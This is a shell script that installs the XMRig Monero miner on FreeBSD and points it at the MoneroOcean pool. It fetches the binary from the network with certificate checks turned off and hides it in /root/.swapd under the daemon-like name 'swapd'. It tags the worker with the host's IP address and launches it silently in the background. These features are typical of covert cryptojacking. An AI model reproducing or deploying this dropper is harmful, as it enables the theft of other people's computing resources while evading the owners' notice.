#!/bin/sh
# Minimal XMRig installer for FreeBSD (static binary)
# Usage: sh install.sh YOUR_WALLET_ADDRESS

if [ -z "$1" ]; then
    echo "Usage: $0 WALLET_ADDRESS"
    exit 1
fi

WALLET="$1"
WORKDIR="/root/.swapd"
mkdir -p "$WORKDIR" || exit 1
cd "$WORKDIR" || exit 1

# Download static XMRig for FreeBSD amd64
URL="https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-freebsd-static-x64.tar.gz"
echo "Downloading $URL ..."
fetch -o xmrig.tar.gz "$URL" 2>/dev/null || curl -L -k -o xmrig.tar.gz "$URL" 2>/dev/null || wget --no-check-certificate -O xmrig.tar.gz "$URL" 2>/dev/null

if [ ! -f xmrig.tar.gz ]; then
    echo "Download failed"
    exit 1
fi

tar -xzf xmrig.tar.gz
if [ -f xmrig ]; then
    mv xmrig swapd
    chmod +x swapd
else
    echo "Binary not found in tarball"
    exit 1
fi
rm -f xmrig.tar.gz

# Detect IP for worker pass (simple fallback)
PASS=$(ifconfig | grep 'inet ' | grep -v '127.0.0.1' | head -1 | awk '{print $2}' | cut -d: -f2)
[ -z "$PASS" ] && PASS="worker"

# Create config.json (MoneroOcean pool)
cat > config.json << EOF
{
    "autosave": false,
    "donate-level": 0,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "coin": "monero",
            "algo": "rx/0",
            "url": "gulf.moneroocean.stream:80",
            "user": "$WALLET",
            "pass": "$PASS",
            "keepalive": true,
            "tls": false
        }
    ]
}
EOF

# Start miner in background
nohup ./swapd -c config.json > /dev/null 2>&1 &
echo "Miner started with wallet: ${WALLET} (worker: $PASS)"
